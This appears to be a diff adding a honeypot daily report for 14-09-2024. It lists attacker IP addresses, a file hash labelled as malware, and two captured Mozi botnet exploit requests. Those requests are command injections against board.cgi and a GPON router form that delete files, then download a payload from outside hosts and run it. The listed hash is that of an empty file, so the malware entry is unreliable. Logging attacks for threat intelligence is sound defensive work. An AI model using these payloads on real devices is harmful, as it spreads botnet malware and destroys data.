@@ -1,0 +1,32 @@
+Top 5 IPs for 14-09-2024 :
+
+178.88.161.82
+103.191.91.138
+132.145.185.47
+202.125.139.10
+71.93.178.9
+
+
+Malware Observed:
+
+File Name : sshd
+e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+https://www.virustotal.com/gui/file/e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+
+
+
+Commands/exploits observed :
+
+
+GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron
+
+
+POST /GponForm/diag_Form?images/ HTTP/1.1
+Host: 127.0.0.1:80
+Connection: keep-alive
+Accept-Encoding: gzip, deflate
+Accept: */*
+User-Agent: Hello, World
+Content-Length: 118
+
+XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+http://117.251.173.19:57103/Mozi.m+-O+->/tmp/gpon80;sh+/tmp/gpon80&ipv=0
